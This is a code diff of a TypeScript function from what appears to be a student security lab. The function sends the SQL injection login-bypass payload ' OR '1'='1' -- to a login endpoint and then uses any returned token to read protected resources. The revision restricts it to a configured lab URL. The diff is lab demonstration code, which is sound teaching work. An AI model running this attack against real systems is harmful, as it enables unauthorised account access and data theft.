@@ -1,49 +1,71 @@
-import { sendAttackerTelemetry } from '../services/telemetry.service.js';
+import { LAB, InputError, exact } from '../config.js';
+import { status } from '../services/telemetry.service.js';
 
-export async function runSqlInjectionAttack(targetUrl: string = 'http://localhost:3000/api/login', payload: string = "' OR '1'='1") {
-  console.log(`[SQLi Attack] Bắt đầu kích hoạt tấn công SQL Injection vào: ${targetUrl}`);
-  console.log(`[SQLi Attack] Payload: ${payload}`);
+async function readJson(response: Response) {
+  return await response.json() as Record<string, unknown>;
+}
 
-  await sendAttackerTelemetry('ATTACK_TRIGGERED', 'WARNING', {
-    attackType: 'SQL_INJECTION',
-    target: targetUrl,
-    status: 'STARTED',
-    payloadExample: payload
-  });
+export async function runSqlInjectionAttack(
+  targetUrl: unknown = LAB.loginUrl,
+  payload: unknown = "' OR '1'='1' --"
+) {
+  exact(targetUrl, LAB.loginUrl, 'targetUrl');
+  if (typeof payload !== 'string' || payload.length < 1 || payload.length > 128) {
+    throw new InputError('payload must be a string of 1-128 characters');
+  }
+
+  status('SQL_INJECTION', 'RUNNING', `[SQLi] Gửi payload tới ${LAB.loginUrl}`, { payload });
 
   try {
-    const res = await fetch(targetUrl, {
+    const loginResponse = await fetch(LAB.loginUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        username: payload,
-        password: 'any_dummy_password'
-      })
+      body: JSON.stringify({ username: payload, password: 'pbl4-invalid-password' }),
+      redirect: 'error',
+      signal: AbortSignal.timeout(5000)
     });
+    const loginData = await readJson(loginResponse);
+    const token = typeof loginData.token === 'string' ? loginData.token : undefined;
 
-    const responseData = await res.json();
-    const success = res.ok && !!responseData.token;
+    let resourceStatus: number | undefined;
+    let resourceCount = 0;
+    if (loginResponse.ok && token) {
+      const resourceResponse = await fetch(LAB.resourcesUrl, {
+        headers: { Authorization: `Bearer ${token}` },
+        redirect: 'error',
+        signal: AbortSignal.timeout(5000)
+      });
+      const resourceData = await readJson(resourceResponse);
+      resourceStatus = resourceResponse.status;
+      resourceCount = Array.isArray(resourceData.data) ? resourceData.data.length : 0;
+    }
 
-    console.log(`[SQLi Attack] Kết quả: ${success ? 'THÀNH CÔNG (Auth Bypassed)' : 'THẤT BẠI'}`);
-
-    await sendAttackerTelemetry('ATTACK_RESULT', success ? 'CRITICAL' : 'WARNING', {
-      attackType: 'SQL_INJECTION',
-      payload,
-      success,
-      capturedToken: responseData.token,
-      leakedData: responseData.user
-    });
+    const success = loginResponse.ok && Boolean(token) && resourceStatus === 200;
+    status(
+      'SQL_INJECTION',
+      'COMPLETED',
+      success ? '[SQLi] Đã xác minh bỏ qua đăng nhập và đọc tài nguyên' : '[SQLi] Không bỏ qua được đăng nhập',
+      {
+        payload,
+        success,
+        loginStatus: loginResponse.status,
+        resourceStatus,
+        resourceCount,
+        user: loginData.user
+      },
+      success ? 'DANGER' : 'WARNING'
+    );
 
     return {
       success,
-      statusCode: res.status,
-      data: responseData
+      loginStatus: loginResponse.status,
+      resourceStatus,
+      resourceCount,
+      user: loginData.user,
+      labRestricted: true
     };
-  } catch (err) {
-    console.error(`[SQLi Attack] Lỗi khi thực hiện: ${(err as Error).message}`);
-    return {
-      success: false,
-      error: (err as Error).message
-    };
+  } catch (error) {
+    status('SQL_INJECTION', 'FAILED', `[SQLi] ${(error as Error).message}`);
+    throw error;
   }
 }
